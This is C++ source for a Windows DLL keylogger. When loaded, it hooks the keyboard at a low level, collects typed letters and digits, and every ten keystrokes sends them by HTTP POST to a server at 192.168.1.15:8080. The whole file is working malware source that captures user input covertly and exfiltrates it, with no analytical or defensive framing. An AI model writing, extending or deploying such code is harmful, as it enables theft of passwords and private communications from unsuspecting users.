#include <windows.h>
#include <wininet.h>  // For InternetOpen and InternetConnect
#include <string>
#include <vector>
#pragma comment(lib, "wininet.lib")

HHOOK hKeyHook;
std::string capturedKeys = "";

// Helper function to convert a narrow string (std::string) to a wide string (std::wstring)
std::wstring StringToWide(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.length(), NULL, 0);
    std::wstring wstrTo(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), (int)str.length(), &wstrTo[0], size_needed);
    return wstrTo;
}

// Function to send the keystrokes to the Python server
void SendKeysToServer(const std::string& keys) {
    HINTERNET hInternet = InternetOpenW(L"Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnectW(hInternet, L"192.168.1.15", 8080, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded";  // Use wide strings for headers
            std::string data = "keystrokes=" + keys;  // Keep as std::string for content
            std::wstring wideData = StringToWide(data);  // Convert data to wide string

            HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", L"/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
            if (hRequest) {
                // Send the POST request with the wide character string
                HttpSendRequestW(hRequest, headers, -1, (LPVOID)wideData.c_str(), wideData.length() * sizeof(wchar_t));
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

// Callback function for the keylogger
LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;

        // Capture keys to a string
        if ((vkCode >= 0x30 && vkCode <= 0x39) || (vkCode >= 0x41 && vkCode <= 0x5A)) {
            char key = MapVirtualKey(vkCode, MAPVK_VK_TO_CHAR);
            capturedKeys += key;
        }

        // If the captured keys string reaches a certain length, send it to the server
        if (capturedKeys.length() >= 10) {  // Adjust the length as necessary
            SendKeysToServer(capturedKeys);
            capturedKeys = "";  // Clear after sending
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

// Function to install the keylogger hook
void InstallHook() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, hInstance, 0);
}

// Entry point for the DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        InstallHook();  // Install the keylogger hook
        break;
    case DLL_PROCESS_DETACH:
        UnhookWindowsHookEx(hKeyHook);  // Remove the hook when the DLL is unloaded
        break;
    }
    return TRUE;
}

